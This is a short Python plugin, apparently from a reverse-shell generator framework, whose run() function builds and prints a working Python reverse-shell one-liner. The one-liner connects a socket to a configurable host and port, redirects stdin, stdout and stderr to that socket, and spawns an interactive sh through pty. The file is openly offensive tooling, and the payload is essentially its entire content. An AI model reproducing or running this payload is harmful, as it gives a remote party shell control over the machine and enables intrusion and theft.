#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Python-based reverse shell
metadata = {
    "name": "SubprocessShell Reverse Shell",
    "description": "A Python-based reverse shell that uses the subprocess and socket modules to establish a remote shell connection.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "127.0.0.1",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": True,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the Python reverse shell command based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    python_script = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""
    print(python_script)
